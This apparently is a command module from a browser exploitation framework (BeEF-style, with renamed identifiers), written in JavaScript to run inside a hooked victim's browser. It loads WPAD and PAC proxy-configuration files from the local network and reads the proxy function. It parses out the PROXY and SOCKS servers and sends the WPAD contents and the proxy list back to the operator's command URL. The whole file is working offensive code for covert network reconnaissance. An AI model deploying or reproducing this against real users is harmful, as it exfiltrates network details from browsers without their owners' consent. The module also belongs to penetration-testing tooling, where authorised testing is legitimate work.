//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  load_script = function(url) {
    server.debug("[Get Proxy Servers] Loading: " + url);
    var s = document.createElement("script");
    s.type = 'text/javascript';
    s.src  = url;
    document.body.appendChild(s);
  }

  read_wpad = function() {
    if (typeof FindProxyForURL === 'function') {
      var wpad = FindProxyForURL.toString();
      server.debug("[Get Proxy Servers] Success: Found wpad (" + wpad.length + ' bytes)');
      server.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=true&wpad="+wpad, server.are.status_success());
    } else {
      server.debug("[Get Proxy Servers] Error: Did not find wpad");
      server.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=false");
      return;
    }
    var proxies = [];
    var proxyRe = /PROXY\s+[a-zA-Z0-9\.\-_]+:[0-9]{1,5}/g;
    while (match = proxyRe.exec(wpad)) {
      proxies.push(match[0]);
    }
    var proxyRe = /SOCKS\s+[a-zA-Z0-9\.\-_]+:[0-9]{1,5}/g;
    while (match = proxyRe.exec(wpad)) {
      proxies.push(match[0]);
    }
    if (proxies.length == 0) {
      server.debug("[Get Proxy Servers] Found no proxies");
      return;
    }
    server.debug("[Get Proxy Servers] Found "+proxies.length+" proxies: " + proxies.join(','));
    server.net.send("<%= @command_url %>", <%= @command_id %>, "proxies=" + proxies.join(','), server.are.status_success());
  }

  load_script("http://wpad/wpad.dat");
  load_script("http://wpad/wpad.pac");

  load_script("http://wpad/proxy.dat");
  load_script("http://wpad/proxy.pac");

  setTimeout("read_wpad()", 10000);

});

